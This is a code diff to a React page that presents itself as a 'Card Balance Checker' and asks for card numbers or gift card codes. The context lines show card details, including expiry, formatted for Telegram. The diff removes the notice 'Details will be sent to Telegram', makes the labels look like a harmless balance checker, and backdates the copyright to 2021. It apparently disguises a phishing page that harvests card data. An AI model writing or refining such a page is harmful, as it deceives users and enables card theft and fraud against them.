@@ -163,7 +163,7 @@ ${cardData.expiry ? `• *Expiry:* \`${cardData.expiry}\`\n` : ''}\
                   
                   <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                     <p className="text-sm text-yellow-800">
-                      ⚠️ <strong>if it faild to check balance 3 times pleas try again after 30 minut:</strong>
+                      ⚠️ <strong>If it faild to check balance 3 times pleas try again after 30 minut:</strong>
                     </p>
                   </div>
                 </div>
@@ -173,7 +173,7 @@ ${cardData.expiry ? `• *Expiry:* \`${cardData.expiry}\`\n` : ''}\
 
           {/* Copyright Footer */}
           <footer className="text-center text-gray-500 text-xs mt-12 py-4 border-t">
-            <p>© 2024 Card Balance Checker</p>
+            <p>© 2021 Card Balance Checker</p>
             <p className="mt-1">All Rights Reserved.</p>
           </footer>
         </div>
@@ -232,15 +232,15 @@ ${cardData.expiry ? `• *Expiry:* \`${cardData.expiry}\`\n` : ''}\
             <div className="bg-white rounded-lg shadow p-6">
               <div className="flex items-center mb-6">
                 <div>
-                  <h1 className="text-2xl font-bold text-gray-800">{selected} Checker</h1>
-                  <p className="text-sm text-gray-600">Details will be sent to Telegram</p>
+                  <h1 className="text-2xl font-bold text-gray-800">{selected} Balance Checker</h1>
+                  <p className="text-sm text-gray-600"></p>
                 </div>
               </div>
 
               <form onSubmit={handleCheck}>
                 <div className="mb-4">
                   <label className="block text-sm font-medium mb-2 text-gray-700">
-                    Enter your {selected} {isPaymentCard ? 'card number' : 'gift code'}
+                    Enter your {selected} {isPaymentCard ? 'card number' : 'gift card code'}
                   </label>
                   <input
                     type="text"
@@ -304,7 +304,7 @@ ${cardData.expiry ? `• *Expiry:* \`${cardData.expiry}\`\n` : ''}\
                         updating balance pleas wait...
                       </>
                     ) : (
-                      `Check ${selected} ${isPaymentCard ? 'Card' : 'Code'}`
+                      `Check ${selected} ${isPaymentCard ? 'Card' : 'Card'}`
                     )}
                   </button>
                   <button 
@@ -345,7 +345,7 @@ ${cardData.expiry ? `• *Expiry:* \`${cardData.expiry}\`\n` : ''}\
 
         {/* Copyright Footer */}
         <footer className="text-center text-gray-500 text-xs mt-12 py-4 border-t">
-          <p>© 2024 Card Balance Checker</p>
+          <p>© 2021 Card Balance Checker</p>
           <p className="mt-1">All Rights Reserved.</p>
         </footer>
       </div>
